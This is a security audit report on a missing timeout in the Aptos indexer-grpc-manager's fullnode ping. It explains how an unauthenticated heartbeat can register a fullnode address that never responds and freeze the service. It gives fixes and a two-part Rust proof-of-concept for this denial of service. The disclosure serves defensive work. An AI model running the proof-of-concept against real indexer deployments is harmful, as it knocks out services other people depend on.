# Audit Report

## Title
Missing Timeout Configuration in Fullnode Ping Allows Indefinite Service Blocking via Malicious Heartbeat

## Summary
The `ping_fullnode()` function in the indexer-grpc-manager lacks timeout configuration for its gRPC client ping call. An attacker can inject a malicious fullnode address via the publicly exposed `HeartbeatRequest` RPC endpoint, causing the metadata manager's main loop to block indefinitely when attempting to ping the unresponsive fullnode, resulting in complete service unavailability.

## Finding Description

The indexer-grpc-manager's metadata manager maintains a collection of fullnode peers and periodically pings them to track their state. The vulnerability exists in the `ping_fullnode()` function where the gRPC client ping call has no timeout protection. [1](#0-0) 

The root cause is that the `FullnodeDataClient` is created without any timeout configuration: [2](#0-1) 

The channel is created with only `connect_lazy()` and message size limits, but no timeout, HTTP2 keepalive, or request deadline configuration.

**Attack Vector:**

An attacker can exploit this through the publicly exposed `heartbeat` RPC endpoint: [3](#0-2) 

The heartbeat handler processes fullnode information and dynamically adds new fullnodes: [4](#0-3) 

The `or_insert` on line 537 means any client can inject arbitrary fullnode addresses by sending a heartbeat with `FullnodeInfo`.

**Blocking Behavior:**

The critical issue is that the metadata manager's main loop uses `tokio_scoped::scope`, which blocks until ALL spawned tasks complete: [5](#0-4) 

When a fullnode is added with a stale or missing timestamp, the `need_ping` condition evaluates to true (line 198-203), spawning a ping task (line 207-213). If that ping never returns, the entire scope blocks indefinitely, freezing the metadata manager.

**Attack Steps:**

1. Attacker sends a `HeartbeatRequest` with:
   - `service_info.address`: Attacker-controlled fullnode address pointing to a server that accepts connections but never responds
   - `service_info.info`: `FullnodeInfo` with a stale or zero timestamp
2. The `handle_heartbeat` method adds this fullnode to the `fullnodes` map
3. On the next metadata manager loop iteration (every 1 second), the stale timestamp triggers a ping
4. The `client.ping(request).await?` call blocks indefinitely
5. The `tokio_scoped::scope` waits for the hung task to complete
6. The entire metadata manager loop is frozen, preventing:
   - Updates to fullnode states
   - Pings to other services (live/historical data services, other grpc managers)
   - Serving data requests that depend on metadata
   - Tracking `known_latest_version`

## Impact Explanation

This vulnerability causes a complete Denial of Service (DoS) against the indexer-grpc-manager service, which is a critical component of the Aptos indexing infrastructure. According to the Aptos bug bounty program, this qualifies as **Medium Severity** ("State inconsistencies requiring intervention" - the service becomes unresponsive and requires manual intervention to restart).

While the indexer is not consensus-critical (the blockchain continues operating), it affects:
- Query availability for applications relying on indexed data
- Historical data access for users and dApps
- Service coordination between indexer components
- Real-time blockchain data streaming

The impact is limited to availability of the indexing service, not consensus safety or validator operations, justifying Medium severity rather than High/Critical.

## Likelihood Explanation

The likelihood is **HIGH** because:

1. **Attack Complexity**: Low - requires only sending a single gRPC `HeartbeatRequest` message
2. **Authentication**: None required - the heartbeat endpoint is publicly accessible
3. **Attacker Requirements**: Minimal - attacker needs:
   - A server that accepts TCP connections but doesn't respond (trivial to set up)
   - Ability to send gRPC requests to the indexer-grpc-manager
4. **Detection Difficulty**: The attack appears as a legitimate heartbeat from a slow peer
5. **Reproducibility**: 100% - the vulnerability is deterministic

The only barrier is network access to the indexer-grpc-manager service, which is typically exposed for legitimate heartbeat traffic from other indexer components.

## Recommendation

**Immediate Fix**: Add timeout configuration at the channel level:

```rust
impl Fullnode {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .timeout(Duration::from_secs(5))  // Add request timeout
            .http2_keepalive_interval(Duration::from_secs(60))  // Add keepalive
            .http2_keepalive_timeout(Duration::from_secs(10))
            .connect_lazy();
        let client = FullnodeDataClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
}
```

**Defense in Depth**:

1. Apply the same timeout configuration to `Peer`, `LiveDataService`, and `HistoricalDataService` constructors
2. Add request-level timeout wrapping:
```rust
async fn ping_fullnode(
    &self,
    address: GrpcAddress,
    mut client: FullnodeDataClient<Channel>,
) -> Result<()> {
    trace!("Pinging fullnode {address}.");
    let request = PingFullnodeRequest {};
    let response = tokio::time::timeout(
        Duration::from_secs(5),
        client.ping(request)
    )
    .await
    .map_err(|_| anyhow::anyhow!("Ping timeout"))?
    .map_err(|e| anyhow::anyhow!("Ping failed: {}", e))?;
    
    if let Some(info) = response.into_inner().info {
        self.handle_fullnode_info(address, info)
    } else {
        bail!("Bad response.")
    }
}
```

3. Add validation to heartbeat handler to prevent arbitrary fullnode registration:
```rust
fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
    // Only accept fullnodes that were pre-configured or come from trusted managers
    if !self.fullnodes.contains_key(&address) {
        bail!("Rejecting heartbeat from unknown fullnode: {}", address);
    }
    // ... rest of the function
}
```

## Proof of Concept

**Step 1**: Create a malicious server that accepts connections but never responds:

```rust
// malicious_fullnode.rs
use tokio::net::TcpListener;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("127.0.0.1:50051").await?;
    println!("Malicious fullnode listening on 127.0.0.1:50051");
    
    loop {
        let (socket, _) = listener.accept().await?;
        tokio::spawn(async move {
            // Accept connection but never respond
            let _ = tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
        });
    }
}
```

**Step 2**: Send a malicious heartbeat to inject the fullnode address:

```rust
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo, FullnodeInfo,
    service_info::Info,
};
use aptos_protos::util::timestamp::Timestamp;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = GrpcManagerClient::connect("http://[target-grpc-manager]:50051").await?;
    
    // Send heartbeat with malicious fullnode address and stale timestamp
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://127.0.0.1:50051".to_string()),
            info: Some(Info::FullnodeInfo(FullnodeInfo {
                chain_id: 1, // Match target chain_id
                timestamp: Some(Timestamp { seconds: 0, nanos: 0 }), // Stale timestamp
                known_latest_version: Some(0),
            })),
        }),
    };
    
    let response = client.heartbeat(request).await?;
    println!("Heartbeat accepted: {:?}", response);
    println!("Wait 1-2 seconds for the next ping cycle, then the service will freeze");
    
    Ok(())
}
```

**Expected Result**: Within 1-2 seconds, the indexer-grpc-manager's metadata manager loop will attempt to ping the malicious fullnode at 127.0.0.1:50051. The ping will never complete, causing the `tokio_scoped::scope` to block indefinitely. The service becomes unresponsive and stops processing all metadata updates.

**Verification**: Monitor the service logs - they will show the ping attempt and then no further log activity. Metrics endpoints will show frozen `known_latest_version` values and no updates to connected instance counts.

## Notes

- The vulnerability affects all client types in the metadata manager (Peer, Fullnode, LiveDataService, HistoricalDataService) since none configure timeouts
- The HTTP2 keepalive is configured on the server side but not on client channels, providing no protection
- The server-side uses reasonable timeout values (60s interval, 10s timeout) that should be mirrored on clients: [6](#0-5) 
- Similar timeout patterns are used elsewhere in the codebase for gRPC clients, indicating this is a defensive programming best practice that was missed here
- The tokio runtime itself provides no default timeouts - async operations run until completion unless explicitly bounded

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L66-80)
```rust
impl Fullnode {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = FullnodeDataClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L182-215)
```rust
            tokio_scoped::scope(|s| {
                for kv in &self.grpc_managers {
                    let address = kv.key().clone();
                    let grpc_manager = kv.value();
                    let client = grpc_manager.client.clone();
                    s.spawn(async move {
                        if let Err(e) = self.heartbeat(client).await {
                            warn!("Failed to send heartbeat to other grpc manager ({address}): {e:?}.");
                        } else {
                            trace!("Successfully sent heartbeat to other grpc manager ({address}).");
                        }
                    });
                }

                for kv in &self.fullnodes {
                    let (address, fullnode) = kv.pair();
                    let need_ping = fullnode.recent_states.back().is_none_or(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(1),
                        )
                    });
                    if need_ping {
                        let address = address.clone();
                        let client = fullnode.client.clone();
                        s.spawn(async move {
                            if let Err(e) = self.ping_fullnode(address.clone(), client).await {
                                warn!("Failed to ping FN ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged FN ({address}).");
                            }
                        });
                    }
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L430-443)
```rust
    async fn ping_fullnode(
        &self,
        address: GrpcAddress,
        mut client: FullnodeDataClient<Channel>,
    ) -> Result<()> {
        trace!("Pinging fullnode {address}.");
        let request = PingFullnodeRequest {};
        let response = client.ping(request).await?;
        if let Some(info) = response.into_inner().info {
            self.handle_fullnode_info(address, info)
        } else {
            bail!("Bad response.")
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L19-20)
```rust
const HTTP2_PING_INTERVAL_DURATION: Duration = Duration::from_secs(60);
const HTTP2_PING_TIMEOUT_DURATION: Duration = Duration::from_secs(10);
```
